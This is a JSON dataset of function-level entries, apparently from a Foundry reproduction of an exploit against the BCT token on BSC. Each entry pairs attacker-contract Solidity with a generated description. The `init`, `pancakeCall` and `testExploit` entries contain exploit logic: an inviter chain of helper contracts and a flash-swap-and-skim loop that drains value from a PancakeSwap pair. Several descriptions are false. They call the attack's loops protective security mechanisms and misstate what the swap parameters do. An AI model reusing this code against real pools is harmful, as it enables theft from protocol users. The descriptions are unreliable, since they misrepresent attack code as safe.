[
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": "1. **Core functions**:  \nThis function is designed to provide a list of artifacts that are excluded from certain operations or processes within the smart contract. It simply retrieves and returns the stored list of excluded artifacts.\n\n2. **Security mechanism**:  \nThe function is marked as `public` and `view`, meaning it can be called by anyone but does not modify the state of the contract. This ensures that it is safe to call without risking unintended changes to the contract's data.\n\n3. **Parameter Function**:  \nThis function does not take any parameters. It only retrieves and returns the predefined list of excluded artifacts stored in the contract.\n\n4. **Return description**:  \nThe function returns an array of strings (`string[] memory`) representing the list of excluded artifacts. The output is directly taken from the internal variable `_excludedArtifacts`, which holds the predefined list.\n\n**In summary**, this function is a simple, read-only utility that provides access to a list of excluded artifacts stored in the contract, ensuring transparency and safety in its operation."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of contract addresses that have been excluded from certain operations or rules within the smart contract. It allows users or other contracts to view which addresses are currently marked as excluded.\n\n2. Security mechanism:  \nThe function uses the `public` and `view` modifiers. The `public` modifier ensures that the function can be called by anyone, while the `view` modifier guarantees that the function does not modify the state of the contract, making it safe to call without incurring gas costs or altering data.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the list of excluded contract addresses stored in the `_excludedContracts` variable.\n\n4. Return description:  \nThe function returns an array of addresses (`address[] memory excludedContracts_`). The output is directly taken from the `_excludedContracts` variable, which contains the list of contract addresses that have been excluded from specific operations or rules within the smart contract.\n\nIn summary, this function is a read-only utility that provides a list of excluded contract addresses, ensuring transparency and accessibility without altering the contract's state."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to provide a list of addresses that have been excluded from certain operations or interactions within the smart contract. It simply retrieves and returns the list of excluded addresses stored in the contract.\n\n2. **Security mechanism:**  \n   The function is marked as `public` and `view`, meaning it can be called by anyone but does not modify the state of the contract. This ensures that the function only reads data and cannot be used to alter or manipulate the contract's state, making it safe for external use.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It directly accesses and returns the stored list of excluded addresses.\n\n4. **Return description:**  \n   The function returns an array of addresses (`address[] memory excludedSenders_`) that represent the list of excluded senders. The output is a direct copy of the `_excludedSenders` array stored in the contract.\n\n**In summary,**  \nThis function is a simple read-only utility that retrieves and returns a list of excluded addresses from the contract. It is safe to use as it does not modify any data and can be accessed by anyone."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": "1. Core functions:  \nThe `failed()` function checks whether a failure condition has occurred. It first looks at a stored variable `_failed` to see if it is true. If `_failed` is not true, it then checks a specific value stored in a virtual machine (VM) to determine if a failure has been recorded there. Essentially, it acts as a failure detection mechanism.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it does not modify the state of the contract, making it safe to call without risking unintended changes. Additionally, it relies on a VM to securely load and verify the failure status, adding an extra layer of validation.\n\n3. Parameter Function:  \nThis function does not take any parameters. It operates solely based on internal state (`_failed`) and external data loaded from the VM.\n\n4. Return description:  \nThe function returns a boolean value (`true` or `false`). If `_failed` is true, it immediately returns `true`. If `_failed` is false, it checks the VM for a stored value. If the value in the VM is not zero, it returns `true`, indicating a failure. Otherwise, it returns `false`, meaning no failure has been detected.\n\nIn summary, the `failed()` function is a simple yet effective way to check for failure conditions, using both internal state and external VM data to ensure accuracy. It is designed to be safe and non-disruptive, thanks to the `view` modifier."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "init",
    "original_code": "    function init() public {\n        address[] memory tools = new address[](5);\n\n        // create 5 tools for the following attack\n        for (uint256 i = 0; i < 5; i++) {\n            Tool tool = new Tool();\n            tools[i] = address(tool);\n        }\n\n        address first = tools[0];\n\n        address[] memory path = new address[](2);\n        path[0] = wbnb;\n        path[1] = bct;\n        // msg.value share to 5 addresses\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(\n            1_000_000_000_000_000, path, address(this), 99_999_999_999_999_999_999_999_999\n        );\n        IERC20(bct).transfer(first, 1_000_000_000_000_000);\n        IInviter(first).f_0x4e515153(bct, address(this), 500_000_000_000_000);\n        uint256 i = 0;\n        while (i < 5) {\n            uint256 k = 4;\n            if (i < k) {\n                address current_tool = tools[i];\n                address next_tool = tools[i + 1];\n                router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(\n                    1_000_000_000_000_000, path, current_tool, 99_999_999_999_999_999_999_999_999\n                );\n                IInviter(current_tool).f_0x4e515153(bct, next_tool, 1_000_000_000_000_000);\n                IInviter(next_tool).f_0x4e515153(bct, current_tool, 500_000_000_000_000);\n            }\n            i++;\n        }\n",
    "description": "1. **Core functions:**  \n   The `init` function is designed to set up and execute a series of operations involving the creation of tools, token swaps, and transfers. It starts by creating five instances of a `Tool` contract and storing their addresses. Then, it performs a token swap using a router contract, transferring tokens to the first tool. After that, it iterates through the tools, performing additional swaps and transfers between them. The function essentially orchestrates a sequence of interactions between contracts and tokens.\n\n2. **Security mechanism:**  \n   The function does not include explicit security mechanisms like access control or input validation. However, it uses fixed values for certain parameters (e.g., `value: 0.00015 ether`) to ensure consistency in operations. The function also relies on external contracts (e.g., `router`, `IERC20`, `IInviter`) to handle specific tasks, which may have their own security measures. The lack of user input reduces the risk of manipulation, but the function could be vulnerable if the external contracts are compromised or behave unexpectedly.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. All values used within the function (e.g., token amounts, addresses) are hardcoded. This means the function operates in a fixed manner and cannot be customized or adjusted during execution. The hardcoded values include the number of tools created, the amount of Ether used in swaps, and the token amounts transferred between contracts.\n\n4. **Return description:**  \n   The function does not return any value. It is a `void` function, meaning its purpose is to perform actions (e.g., creating tools, swapping tokens, transferring funds) rather than calculating or producing an output. The effects of the function are seen in the state changes it causes, such as the creation of new contracts and the movement of tokens between addresses.\n\n**In summary,**  \nThe `init` function is a setup and execution function that creates five `Tool` contracts, performs token swaps, and transfers tokens between them. It uses hardcoded values and relies on external contracts to carry out its tasks. While it lacks explicit security features, its fixed operation reduces the risk of manipulation. The function does not return any value but causes state changes through its actions."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        // address inviter = 0xe9616ff20ad519Bce0e3D61353a37232F0c27A50; // the attacker contract\n        address inviter = address(this);\n        uint256 index = 0;\n        address[] memory inviters = new address[](5);\n        while (index < 5) {\n            address inviter_ = IBCT(bct).inviter(inviter);\n            inviters[index] = inviter_;\n            inviter = inviter_;\n            index++;\n\n            uint256 amount = IERC20(bct).balanceOf(inviter_);\n        }\n        index = 0;\n        while (index < 5) {\n            (uint112 reserve0, uint112 reserve1, uint32 timestamp) = IPancakePair(pancakepair).getReserves();\n\n            uint256 buyAmount = calculateValue(reserve1, reserve0, 60e18);\n\n            Wbnb.transfer(inviters[index], buyAmount);\n            // vm.prank(address(this), 0x9c66B0c68c144Ffe33E7084FE8cE36EBC44aD21e);\n            IInviter(inviters[index]).buy(wbnb, pancakepair, buyAmount);\n            index++;\n        }\n\n        index = 0;\n        while (index < 10) {\n            uint256 balance = Wbnb.balanceOf(address(this));\n            (uint112 reserve0, uint112 reserve1, uint32 timestamp) = IPancakePair(pancakepair).getReserves();\n            uint256 amount = calculate(reserve1, reserve0, balance);\n\n            Wbnb.transfer(pancakepair, balance);\n            IPancakePair(pancakepair).swap(amount, 0, cake_lp, \"\");\n            IPancakePair(cake_lp).skim(address(this));\n\n            while (true) {\n                uint256 bct_balance = IERC20(bct).balanceOf(address(this));\n                if (bct_balance > 1e18) {\n                    IERC20(bct).transfer(cake_lp, bct_balance);\n                    IPancakePair(cake_lp).skim(address(this));\n                } else {\n                    process(30e18, inviters);\n                    index++;\n                    break;\n                }\n",
    "description": "1. Core functions:  \nThe `pancakeCall` function is designed to interact with a decentralized exchange (DEX) and perform a series of operations involving token transfers, swaps, and balance checks. It first retrieves a list of addresses (inviters) associated with a specific token contract. Then, it calculates and transfers a certain amount of tokens to these addresses and triggers a \"buy\" function on each of them. Afterward, it performs multiple token swaps and balance adjustments to ensure the correct distribution of tokens. Finally, it processes a specific amount of tokens and updates the state accordingly.\n\n2. Security mechanism:  \nThe function includes several security measures:  \n- It uses `public` visibility, meaning it can be called by anyone, but the logic inside ensures that only specific operations are performed.  \n- It relies on external contract calls (e.g., `IBCT`, `IERC20`, `IPancakePair`) to fetch data and perform actions, which ensures that the function adheres to the rules defined in those contracts.  \n- It includes balance checks and loops to ensure that operations are performed only when certain conditions are met, preventing unintended behavior.  \n- The function avoids hardcoding sensitive data (e.g., addresses) directly, making it more flexible and secure.  \n\n3. Parameter Function:  \n- `sender`: The address that initiated the call, used to identify the caller.  \n- `amount0` and `amount1`: These represent the amounts of two tokens involved in the operation, likely used for calculations or checks.  \n- `data`: Additional data passed to the function, which can be used for custom logic or instructions.  \n\n4. Return description:  \nThe function does not explicitly return a value. Instead, it performs a series of operations that modify the state of the contract and external contracts. These operations include transferring tokens, swapping tokens on a DEX, and updating balances. The logic ensures that the correct amounts of tokens are moved and processed based on the calculations and conditions defined in the function.  \n\nIn summary, the `pancakeCall` function orchestrates a complex series of token transfers and swaps on a decentralized exchange, ensuring that specific addresses receive tokens and that the contract's state is updated correctly. It incorporates security measures to prevent misuse and relies on external contracts for data and actions."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 34_204_710 - 1);\n        deal(address(this), 0.1 ether);\n    }\n\n",
    "description": "1. **Core functions**:  \n   The `setUp` function is designed to prepare the environment for testing or simulation. It does two main things: first, it creates a simulated blockchain environment (a \"fork\") based on a specific block number from the Binance Smart Chain (BSC). Second, it allocates a small amount of Ether (0.1 ETH) to the contract's address. This setup is typically used in testing scenarios to mimic real-world conditions.\n\n2. **Security mechanism**:  \n   The function uses the `public` visibility modifier, meaning it can be called by anyone. However, since this is likely a testing function, it doesn't include strict security measures like access control. The `cheats.createSelectFork` and `deal` functions are part of a testing framework (e.g., Foundry) that simulates blockchain behavior, ensuring the environment is isolated and controlled for testing purposes.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It relies on hardcoded values: the blockchain identifier (\"bsc\"), a specific block number (34,204,710 - 1), and the amount of Ether (0.1 ETH) to allocate. These values are predefined to create a consistent testing environment.\n\n4. **Return description**:  \n   The function does not return any value. Its purpose is purely to set up the environment by creating a blockchain fork and allocating Ether, rather than performing calculations or producing outputs.\n\nIn summary, the `setUp` function is a utility for preparing a simulated blockchain environment for testing, allocating a small amount of Ether to the contract, and ensuring consistent conditions for testing scenarios."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": "1. **Core functions**:  \n   This function is designed to provide a list of specific selectors (identifiers) for artifacts that are targeted for fuzz testing. Fuzz testing is a method of testing software by providing random or unexpected inputs to find vulnerabilities. The function simply retrieves and returns the stored list of these selectors.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract. This prevents any unintended changes to the contract's data. Additionally, since it only reads and returns stored data, it reduces the risk of exposing sensitive information or introducing vulnerabilities.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It operates solely on the internal state of the contract, specifically accessing the `_targetedArtifactSelectors` variable to retrieve the list of selectors.\n\n4. **Return description**:  \n   The function returns an array of `FuzzSelector` objects, which represent the selectors for the targeted artifacts. The return value is directly taken from the internal variable `_targetedArtifactSelectors`, meaning it provides the exact list of selectors stored in the contract.\n\n**In summary**, this function is a simple, read-only utility that retrieves and returns a list of selectors used for fuzz testing, ensuring no state changes occur during its execution."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": "1. **Core functions**:  \n   This function is designed to provide a list of specific items, referred to as \"artifacts,\" that are being targeted. It acts as a simple retrieval tool, allowing anyone to view the list of these artifacts stored in the contract.  \n\n2. **Security mechanism**:  \n   The function uses the `public` and `view` modifiers. The `public` modifier ensures that the function can be called by anyone, while the `view` modifier guarantees that the function does not modify the state of the contract, making it safe to call without incurring gas costs or altering any data.  \n\n3. **Parameter Function**:  \n   This function does not take any parameters. It simply retrieves and returns the stored list of targeted artifacts.  \n\n4. **Return description**:  \n   The function returns an array of strings (`string[] memory`) that represents the list of targeted artifacts. The value returned is directly taken from the internal storage variable `_targetedArtifacts`, ensuring that the output is an exact copy of the stored data.  \n\n**In summary**, this function is a straightforward tool for accessing a list of targeted artifacts stored in the contract. It is safe to use, as it does not modify any data, and it provides the exact list stored in the contract."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": "1. **Core functions**:  \n   This function is designed to provide a list of addresses that are being targeted or monitored within the smart contract. It essentially acts as a way to retrieve and display the stored addresses that the contract is focusing on.\n\n2. **Security mechanism**:  \n   The function uses the `public view` modifiers. The `public` modifier allows anyone to call this function, while the `view` modifier ensures that the function does not modify the state of the contract, making it read-only and safe to use without any risk of altering data.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It simply retrieves and returns the list of targeted addresses stored in the `_targetedContracts` variable.\n\n4. **Return description**:  \n   The function returns an array of addresses (`address[] memory targetedContracts_`). The output is directly taken from the `_targetedContracts` variable, which holds the list of addresses the contract is targeting. No additional calculations or transformations are applied to the data.\n\n**In summary**, this function is a straightforward, read-only tool that allows users to access the list of addresses the smart contract is focusing on, without any risk of modifying the contract's state."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of interfaces that are being targeted or focused on within the smart contract. It acts as a simple retrieval mechanism, allowing users or other parts of the system to access the stored interface information.\n\n2. Security mechanism:  \nThe function includes the `public` and `view` modifiers. The `public` modifier ensures that the function can be called by anyone, while the `view` modifier guarantees that the function does not modify the state of the contract, making it safe to call without any risk of altering data.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the stored list of targeted interfaces without requiring any input.\n\n4. Return description:  \nThe function returns an array of `FuzzInterface` objects, which represents the list of interfaces being targeted. The return value is directly fetched from the internal storage variable `_targetedInterfaces`, ensuring that the output is an exact copy of the stored data.\n\nIn summary, this function is a straightforward retrieval tool that provides access to a list of targeted interfaces in a secure and read-only manner."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": "1. **Core functions:**  \nThis function is designed to provide a list of specific selectors that are being targeted. Selectors are unique identifiers for functions in a smart contract. Essentially, this function acts as a way to retrieve and display which functions are being focused on or monitored within the contract.\n\n2. **Security mechanism:**  \nThe function uses the `view` modifier, which ensures that it does not modify the state of the contract. This means it only reads data and does not perform any actions that could change the contract's state, making it safe to call without worrying about unintended side effects.\n\n3. **Parameter Function:**  \nThis function does not take any parameters. It simply retrieves and returns the stored list of targeted selectors.\n\n4. **Return description:**  \nThe function returns an array of `FuzzSelector` objects, which represent the targeted selectors. The return value is directly taken from the internal storage variable `_targetedSelectors`, meaning it provides a snapshot of the selectors currently being focused on.\n\nIn summary, this function is a simple read-only utility that retrieves and returns a list of targeted function selectors, ensuring no state changes occur during its execution."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": "1. **Core function**:  \n   The `targetSenders` function is designed to provide a list of addresses that have been marked as \"targeted senders.\" It simply retrieves and returns this list, allowing users or other parts of the system to see which addresses are being tracked or monitored.\n\n2. **Security mechanism**:  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It is also marked as `view`, which ensures that it does not modify the state of the contract or blockchain, making it safe to call without incurring gas costs or risks of unintended changes.  \n\n3. **Parameter Function**:  \n   The function does not take any parameters. It operates solely on the internal state of the contract, specifically the `_targetedSenders` array.  \n\n4. **Return description**:  \n   The function returns an array of addresses (`address[] memory targetedSenders_`). This array is directly copied from the internal `_targetedSenders` variable, which stores the list of addresses that are considered \"targeted senders.\"  \n\nIn summary, the `targetSenders` function is a simple, read-only function that provides access to a list of addresses stored in the contract. It is secure and does not require any input parameters."
  },
  {
    "contract/interface": "BCT",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        uint256 before = Wbnb.balanceOf(address(this));\n        init(); // simulate the first tx for preparation\n        // attack begin\n        PancakePair.swap(20_000_000_000_000_000_000, 0, address(this), abi.encode(\"0x20\"));\n        emit log_named_decimal_uint(\n            \"[End] After repay, Profit: BNB balance of attacker\", Wbnb.balanceOf(address(this)) - before, 18\n        );\n    }\n\n    // simulate the preparation of the attack, tx: https://bscscan.com/tx/0xd4c19d575ea5b3a415cc288ce09942299ca3a3b49ef9718cda17e4033dd4c250\n",
    "description": "1. Core functions:\n   The `testExploit` function is designed to simulate an attack on a decentralized finance (DeFi) system. It first records the initial balance of Wrapped BNB (WBNB) held by the contract. Then, it calls the `init` function to prepare for the attack. After preparation, it executes a swap on a PancakeSwap pair, sending a large amount of tokens and receiving WBNB in return. Finally, it calculates and logs the profit made from the attack by comparing the final WBNB balance to the initial balance.\n\n2. Security mechanism:\n   The function does not explicitly include security mechanisms like access control or input validation. However, it uses `abi.encode` to encode the data for the swap function, which ensures that the data is correctly formatted. The function also emits an event to log the profit, which can be useful for monitoring and auditing purposes.\n\n3. Parameter Function:\n   - `PancakePair.swap(20_000_000_000_000_000_000, 0, address(this), abi.encode(\"0x20\"))`: This line performs the swap operation. The first parameter is the amount of tokens to be swapped, the second parameter is the minimum amount of tokens to receive (set to 0, indicating no minimum), the third parameter is the address that will receive the tokens (the contract itself), and the fourth parameter is the encoded data for the swap.\n\n4. Return description:\n   The function does not return a value directly. Instead, it calculates the profit by subtracting the initial WBNB balance from the final WBNB balance and logs this value using an event. The profit is expressed in WBNB with 18 decimal places, which is the standard for most ERC-20 tokens.\n\nIn summary, the `testExploit` function simulates an attack on a DeFi system by performing a swap on a PancakeSwap pair and calculating the profit in WBNB. It uses `abi.encode` for data formatting and logs the profit using an event. The function does not include explicit security mechanisms but relies on the underlying DeFi protocols for transaction execution."
  },
  {
    "contract/interface": "Tool",
    "source_type": "victim_contract",
    "function_name": "buy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Tool",
    "source_type": "victim_contract",
    "function_name": "f_0x4e515153",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Tool",
    "source_type": "victim_contract",
    "function_name": "f_0xf986351d",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IBCT",
    "source_type": "victim_contract",
    "function_name": "inviter",
    "original_code": "",
    "description": ""
  }
]